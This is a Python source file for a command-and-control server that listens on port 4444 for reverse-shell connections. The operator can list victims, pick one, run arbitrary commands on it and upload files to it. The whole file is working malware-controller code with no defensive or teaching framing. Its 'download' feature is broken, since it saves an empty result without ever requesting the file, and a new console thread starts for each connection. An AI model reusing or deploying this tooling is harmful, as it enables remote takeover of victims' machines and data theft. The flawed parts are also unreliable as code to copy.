import threading, socket, json, base64, sys, traceback

class Client:
    def __init__(self, id, socket, address):
        self.id = id
        self.socket = socket
        self.address = address

class Server:
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(('192.168.17.130', 4444))
        self.server.listen()
        self.clients = []
        self.client = ""
        self.id_counter = 0
        self.target_client = "Empty"  # client now
        print("[+] Waiting for incoming connections")

    #serialization
    def reliable_send(self, data):
        json_data=json.dumps(data)
        self.target_client.socket.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.target_client.socket.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0]=="exit":
            self.target_client.socket.close()
            self.clients.remove(self.target_client)
            self.target_client = "Empty"
            return
        return self.reliable_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful."

    def check_remove_connections(self, target_client):     
        client = target_client.socket
        try:       
            client.send("check".encode())
            response = client.recv(1024)
            if not response:      
                self.clients.remove(target_client)
                return False
            else:
                print("connected..")
        except Exception as err:
            print(err)
            self.clients.remove(target_client)
            return False
        return True

    def now_enter(self):
        if self.target_client == "Empty":
            clientstr = self.target_client
        else:                
            clientstr = str(self.target_client.address)              
        command = input( clientstr + ">> ") 
        return command.split(" ")       

    def run(self):
        while True:
            
            command = self.now_enter()
            
            result = ""
            try:
                
                if command[0]=="exitL":
                    self.stop()
                    break
                    
                elif command[0] == 'list':
                    for client in self.clients:                   
                        print(f'Client {client.id} - {client.address}')
                
                elif command[0] == 'set':
                    client_id = input("Enter the ID of the client: ")
                    try:
                        client_id = int(client_id)
                    except ValueError:
                        result = 'Invalid client id'
                        continue
                    target_client = next((c for c in self.clients if c.id == client_id), None)                
                    if target_client:
                        self.target_client = target_client
                        result =  f'set Client {target_client.id} - {target_client.address}'
                                                     
                elif command[0] == 'now':
                    if not self.target_client == "Empty": 
                        result =  f'now Client {self.target_client.id} - {self.target_client.address}'
                    else :
                        result = "not set client"
                        
                elif command[0] == 'check':
                     self.check_remove_connections(self.target_client)
                                                             
                elif command[0]=="upload" and self.target_client != "Empty":
                    file_content=self.read_file(command[1])
                    command.append(file_content.decode())
                    result = self.execute_remotely(command)
                                                  
                elif command[0]=="download" and "[-] Error " not in result and self.target_client != "Empty":
                    result=self.write_file(command[1], result)
                
                elif self.target_client != "Empty":   
                    result = self.execute_remotely(command)
                
            except Exception as err:
                exception_type, exception_object, exception_traceback = sys.exc_info()
                traceback.print_tb(exception_traceback, limit=2, file=sys.stdout)
                print("it exept - " + str(err) )
                result ="[-] Error during command execution"
            
            if not result == "":
                print(result)
                result = ""

    def stop(self):
        exit() 

    def receive(self):
        while True:
            client, address = self.server.accept()
            print(f'\nConnected by {str(address)}')
            self.id_counter += 1
            client_obj = Client(self.id_counter, client, address)
            self.clients.append(client_obj)
            if self.target_client == "Empty":
                self.target_client = client_obj
                self.client = client
            threading.Thread(target=self.run).start()

if __name__ == '__main__':

    try:
        server = Server()
        server.receive()
    except Exception:
        # server.stop()
        sys.exit()